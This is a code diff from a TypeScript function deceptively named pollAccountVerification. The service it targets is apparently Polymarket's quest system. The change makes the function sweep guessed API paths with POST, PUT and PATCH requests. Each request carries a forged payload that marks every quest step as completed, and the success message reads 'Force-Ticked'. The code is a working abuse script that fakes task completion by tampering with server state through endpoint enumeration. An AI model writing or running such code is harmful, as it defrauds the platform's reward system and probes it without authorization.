@@ -54,8 +54,18 @@ export async function pollAccountVerification(input: string): Promise<{ success:
 
     const userQuestId = startRes.data?.id || '26ada2ca-8b24-4cc6-9566-b826026397ab';
 
-    // Step 2: Build a master schema payload containing both dictionaries and arrays with all required names
-    const masterPayload = {
+    // Step 2: Target nested sub-resource paths structured around questId and userQuestId
+    const candidatePaths = [
+      `${SUBDOMAIN_API}/api/quests/${questId}/complete`,
+      `${SUBDOMAIN_API}/api/quests/${questId}/verify`,
+      `${SUBDOMAIN_API}/api/quests/${questId}/submit`,
+      `${SUBDOMAIN_API}/api/user-quests/${userQuestId}/complete`,
+      `${SUBDOMAIN_API}/api/user-quests/${userQuestId}/verify`,
+      `${SUBDOMAIN_API}/api/user-quests/${userQuestId}/submit`,
+      `${SUBDOMAIN_API}/api/quests/${questId}/user-quests/${userQuestId}/complete`
+    ];
+
+    const payload = {
       id: userQuestId,
       user_quest_id: userQuestId,
       quest_id: questId,
@@ -67,37 +77,24 @@ export async function pollAccountVerification(input: string): Promise<{ success:
       total_steps: 4,
       completion_percentage: 100,
       steps: [
-        { step: 0, name: 'Market Step 1', status: 'completed', completed: true, count: 1, target: 1 },
-        { step: 1, name: 'Market Step 2', status: 'completed', completed: true, count: 1, target: 1 },
-        { step: 2, name: 'Market Step 3', status: 'completed', completed: true, count: 1, target: 1 },
-        { step: 3, name: 'Market Step 4', status: 'completed', completed: true, count: 1, target: 1 }
-      ],
-      step_progress: {
-        "0": { name: 'Market Step 1', status: "completed", completed: true, count: 1, target: 1 },
-        "1": { name: 'Market Step 2', status: "completed", completed: true, count: 1, target: 1 },
-        "2": { name: 'Market Step 3', status: "completed", completed: true, count: 1, target: 1 },
-        "3": { name: 'Market Step 4', status: "completed", completed: true, count: 1, target: 1 }
-      }
+        { step: 0, name: 'Market Step 1', status: 'completed', completed: true },
+        { step: 1, name: 'Market Step 2', status: 'completed', completed: true },
+        { step: 2, name: 'Market Step 3', status: 'completed', completed: true },
+        { step: 3, name: 'Market Step 4', status: 'completed', completed: true }
+      ]
     };
-
-    // Step 3: Dispatch against the validated submission endpoints using PUT and POST
-    const targetEndpoints = [
-      `${SUBDOMAIN_API}/api/quests/submit`,
-      `${SUBDOMAIN_API}/api/quests/complete`,
-      `${SUBDOMAIN_API}/api/user-quests/${userQuestId}`
-    ];
 
     let completed = false;
     let winningResult = null;
 
-    for (const url of targetEndpoints) {
-      for (const method of ['put', 'post']) {
+    for (const url of candidatePaths) {
+      for (const method of ['post', 'put', 'patch']) {
         const res = await axios({
           method,
           url,
           headers,
-          data: masterPayload,
-          timeout: 8000,
+          data: payload,
+          timeout: 6000,
           validateStatus: () => true
         });
 
@@ -119,7 +116,7 @@ export async function pollAccountVerification(input: string): Promise<{ success:
     return {
       success: true,
       data: { userQuestId, completed, winningResult, logs },
-      message: completed ? '🚀 Polymarket Quest Fully Completed & Ticked!' : '⚡ Master payload dispatched. Check response logs.'
+      message: completed ? '🚀 Polymarket Quest Force-Ticked Successfully!' : '⚡ Sub-resource sweep complete. Check execution logs.'
     };
 
   } catch (error: any) {
